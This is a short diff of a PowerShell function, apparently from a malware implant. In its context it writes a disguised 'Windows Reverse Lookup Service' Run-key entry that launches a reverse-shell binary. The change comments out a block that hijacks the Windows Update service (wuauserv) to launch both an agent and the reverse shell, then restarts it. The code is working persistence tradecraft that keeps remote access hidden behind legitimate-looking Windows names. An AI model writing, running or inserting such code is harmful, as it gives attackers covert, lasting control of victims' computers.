@@ -71,14 +71,14 @@ function Invoke-Callback {
         Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Windows Reverse Lookup Service" -Value $revShellPath
     }
     else {
-        # Modify wuauserv to launch both binaries
-        $svc = Get-WmiObject -Class Win32_Service -Filter "Name='wuauserv'"
-        if ($svc) {
-            $currentPath = $svc.PathName.Trim('"')
-            $newPath = "$currentPath & `"$agentPath`" & `"$revShellPath`""
-            $svc.Change($null,$null,$null,$null,$null,$null,$newPath,$null)
-            Start-Service wuauserv
-        }
+        # # Modify wuauserv to launch both binaries
+        # $svc = Get-WmiObject -Class Win32_Service -Filter "Name='wuauserv'"
+        # if ($svc) {
+        #     $currentPath = $svc.PathName.Trim('"')
+        #     $newPath = "$currentPath & `"$agentPath`" & `"$revShellPath`""
+        #     $svc.Change($null,$null,$null,$null,$null,$null,$newPath,$null)
+        #     Start-Service wuauserv
+        # }
     }
 }
 
